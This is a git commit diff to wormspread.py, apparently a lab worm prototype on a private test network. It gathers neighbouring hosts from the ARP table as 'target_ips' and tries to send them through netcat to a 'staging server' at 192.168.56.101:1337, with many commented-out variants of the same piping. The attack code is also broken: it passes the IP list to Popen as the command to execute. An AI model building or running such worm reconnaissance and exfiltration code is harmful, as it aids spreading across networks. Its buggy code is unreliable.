d402e98c81bafdea4536007445b4635adb5f57e3
Greg Randall <77461008+gregorymrandall@users.noreply.github.com>
2021-07-13 13:40:45 -0400

    Update wormspread.py

--- wormspread.py
+++ wormspread.py
@@ -2,8 +2,11 @@
 
 import subprocess
 import re
+import os
 
 def worm_spread():
+
+    target_ips=[]
  
     arp_list = subprocess.check_output(["arp", "-a"])
 
@@ -11,19 +14,42 @@ def worm_spread():
     
     ips = re.findall(pattern, arp_list)
 
-    print(ips)
-
     unwanted_ips = ["192.168.56.1", "192.168.56.100", "192.168.56.101"]
 
     for i in ips:
         if i not in unwanted_ips:
-            print(i)
-        
-worm_spread()
+            target_ips.append(i)
+    return target_ips
+
+print(worm_spread())
+
 
 def nc_listener():
-    #sending to staging server via netcat
-    subprocess.call(["nc", "192.168.56.101", "1337"])
+
+    #subprocess.call(["nc", "192.168.56.101", "1337"])
+
+    args=worm_spread()
+
+    child_process=subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+    child_process_output=child_process.communicate(["nc","192.168.56.101","1337"])
+    print(child_process_output)
+
+    #read, write = os.pipe()
+    #os.write(write, "worm_spread()")
+    #os.close(write)
+
+    #subprocess.check_call(["nc","192.168.56.101","1337"])
+
+    #p=Popen([xxxxxxxxxxx],stdout=subprocess.PIPE,stdin=subprocess.PIPE)
+    #p.stdin.write(worm_spread())
+    #p.communicate()[0]
+
+    #p1 = subprocess.call("nc '192.168.56.101' '1337' < worm_spread()", capture_output=True, text=True, shell=True)
+    #print(p1.stdout)
+
+    #subprocess.call('worm_spread() | nc 192.168.56.101 1337', capture_output=True, text=True, shell=True)
+    #print(p1.stdout)
+
+    #subprocess.call(["nc","192.168.56.101", "1337"], stdin = worm_spread(), stdout=None, stderr=None, shell=False)
 
 print(nc_listener())
-
